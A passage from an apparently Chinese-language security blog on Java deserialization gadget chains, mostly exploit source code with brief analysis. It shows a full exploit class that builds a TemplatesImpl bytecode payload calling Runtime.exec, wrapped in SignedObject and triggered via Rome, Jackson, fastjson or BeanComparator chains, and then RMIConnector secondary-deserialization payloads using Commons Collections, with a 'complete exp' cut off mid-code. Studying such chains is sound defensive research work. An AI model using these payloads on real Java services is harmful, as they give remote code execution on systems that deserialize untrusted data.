com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc5_Templateslmpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.TreeMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">signedobject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br><br><span class="hljs-comment">//        一、利用链：hashmap-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.EqualsBean.javabeanHashCode()-&gt;EqualsBean.toString()-&gt;jackson.databind.node.POJONode.toString()-&gt;com.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;templates.getOutputProperties()</span><br><span class="hljs-comment">//        POJONode jsonNodes = new POJONode(templates);</span><br><span class="hljs-comment">//        EqualsBean bean = new EqualsBean(String.class, &quot;22&quot;);</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap.put(bean,&quot;222&quot;);</span><br><span class="hljs-comment">//        setFieldValue(bean,&quot;_obj&quot;,jsonNodes);</span><br><br><span class="hljs-comment">//       二、利用链：HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;**com.alibaba.fastjson.JSONObject.toString()/com.alibaba.fastjson.JSONArray.toString()**-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com/alibaba/fastjson/serializer/JSONSerializer.java#write()-&gt;com/alibaba/fastjson/serializer/ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;templates.getOutputProperties()</span><br><span class="hljs-comment">//        JSONObject jsonObject = new JSONObject();</span><br><span class="hljs-comment">//        jsonObject.put(&quot;1&quot;,templates);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val, &quot;val&quot;, jsonObject);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap2.put(templates,val);</span><br><br><span class="hljs-comment">//        三、利用链：BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;templates.getOutputProperties()</span><br>      <br><span class="hljs-comment">//        删除 BaseJsonNode 的 writeReplace,使能写入序列化数据</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool_1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool_1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonNodes);<br><br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(val, privateKey,signature );<br><br><br><span class="hljs-comment">//        一、利用链：hashmap-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.ObjectBean.hashcode()-&gt;EqualsBean.javabeanHashCode()-&gt;oStringBean.java#toString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="hljs-comment">//        ObjectBean root = new ObjectBean(ToStringBean.class, toStringBean);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap1.put(root,&quot;x&quot;);</span><br><br><span class="hljs-comment">//        二、BadAttributeValueExpException.readObject()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, toStringBean);</span><br><br><span class="hljs-comment">//        三、BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        POJONode jsonNodes1 = new POJONode(signedObject);</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, jsonNodes1);</span><br><br><br><span class="hljs-comment">//        四、HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;**com.alibaba.fastjson.JSONObject.toString()/com.alibaba.fastjson.JSONArray.toString()**-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com/alibaba/fastjson/serializer/JSONSerializer.java#write()-&gt;com/alibaba/fastjson/serializer/ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;SignedObject.getObject()</span><br><span class="hljs-comment">////        JSONObject jsonObject = new JSONObject();</span><br><span class="hljs-comment">////        jsonObject.put(&quot;222&quot;,signedObject);</span><br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(signedObject);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, objects);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap1.put(signedObject,val1);</span><br><br><span class="hljs-comment">//        五、PriorityQueue.readObect()-&gt; org.apache.commons.beanutils.BeanComparator.compare()-&gt;PropertyUtils.getProperty()-&gt;SignedObject.getObject()-&gt;PropertyUtilsBean.java#getSimpleProperty()-&gt;SignedObject.getObject()</span><br>        BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;();<br>        setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>);<br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);<br><br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,objectBeanComparator);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        Object[] objects = &#123;signedObject, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">ser2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser2);<br>        oos.writeObject(priorityQueue);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser2&quot;</span>));<br>        ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01  分析"></a>0x01  分析</h3><p>javax.management.remote.rmi.RMIConnector#findRMIServerJRMP()</p><p><img src="image-20240118001634774.png" alt="image-20240118001634774"></p><p><img src="image-20240118001428885.png" alt="image-20240118001428885"></p><p>可以看到传入base64字节，然后转object流，然后序列化</p><p>往上跟</p><p>javax.management.remote.rmi.RMIConnector#findRMIServer()</p><p><img src="image-20240118001855185.png" alt="image-20240118001855185"></p><p>可以看到以“&#x2F;stub&#x2F;”开头就会调用findRMIServerJRMP()</p><p>javax.management.remote.rmi.RMIConnector#connect()</p><p><img src="image-20240118002403207.png" alt="image-20240118002403207"></p><p><img src="image-20240118002245659.png" alt="image-20240118002245659"></p><p>可以看见rmiServer等于空就回调用findRMIServer()</p><p>查看构造方法</p><p><img src="image-20240118002459279.png" alt="image-20240118002459279"></p><p><img src="image-20240118002515910.png" alt="image-20240118002515910"></p><p>可以看见构造方法符合条件。</p><p><img src="image-20240118002840672.png" alt="image-20240118002840672"></p><p>JMXServiceURL必须为service:jmx:开头。</p><p><img src="image-20240118003522640.png" alt="image-20240118003522640"></p><p>这里获取JMXServiceURL的URLPATH，然后URLPATH要以&#x2F;stub&#x2F;开头，截取第6位到末位的字符传入触发二次反序列化。</p><p>所以new一个JMXServiceURL对象，然后反射赋值就行。最后构造RMIConnector。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+serbase64);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-构造"><a href="#0x02-构造" class="headerlink" title="0x02 构造"></a>0x02 构造</h3><p>由于我们要出发connect()，它不是javabean，所以有很多限制，佬们想到的是cc的invoketransfrom来触发。</p><p>既然是cc触发，说实话，如大佬所说鸡肋。</p><p>cc链触发，很容易想到cc4.0用PriorityQueue，cc 3.2.1一下用lazymap.get()</p><h4 id="一、cc6前半"><a href="#一、cc6前半" class="headerlink" title="一、cc6前半"></a>一、cc6前半</h4><p>hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;tiedMapEntry.hashcode-&gt;tiedMapEntry.getValue-&gt;lazyMap.get()-&gt;invokerTransformer.Transformer()-&gt;rmiConnector.connect()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate( <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, rmiConnector);<br><br>HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xx&quot;</span>);<br>lazyMap.clear();<br>setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokerTransformer);<br></code></pre></td></tr></table></figure><h4 id="二、-cc4-0、PriorityQueue"><a href="#二、-cc4-0、PriorityQueue" class="headerlink" title="二、 cc4.0、PriorityQueue"></a>二、 cc4.0、PriorityQueue</h4><p>PriorityQueue.readObject()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.comparator()-&gt;InvokerTransformer.transformer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br><br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>Object[] objects = &#123;rmiConnector, <span class="hljs-number">1</span>&#125;;<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,comparator);<br></code></pre></td></tr></table></figure><h4 id="三、-cc3-2-1-cc4-动态代理"><a href="#三、-cc3-2-1-cc4-动态代理" class="headerlink" title="三、 cc3.2.1 cc4  动态代理"></a>三、 cc3.2.1 cc4  动态代理</h4><p>AnnotationInvocationHandler.readObject-&gt;AnnotationInvocationHandler.invoke-&gt;DefaultedMap.get()-&gt;transformerChain.transformer()-&gt;InvokerTransformer.transformer()-&gt;rmiConnector.connect()</p><p>CC4 没有lazymap了， 改用defaultedMap即可。cc1都可以用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>DefaultedMap&lt;Object, Optional&lt;ConstantTransformer&gt;&gt; defaultedMap =<br>        DefaultedMap.defaultedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)));<br>setFieldValue(defaultedMap,<span class="hljs-string">&quot;value&quot;</span>, transformerChain);<br><br>Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared =<br>        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, defaultedMap);<br><span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Anotationdeclared.newInstance(Override.class,Mapproxy);<br></code></pre></td></tr></table></figure><h3 id="0x03-完整exp-1"><a href="#0x03-完整exp-1" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc1;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc5;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rmiconnector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;ser2&quot;</span>);<br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(file.toPath());<br>        <span 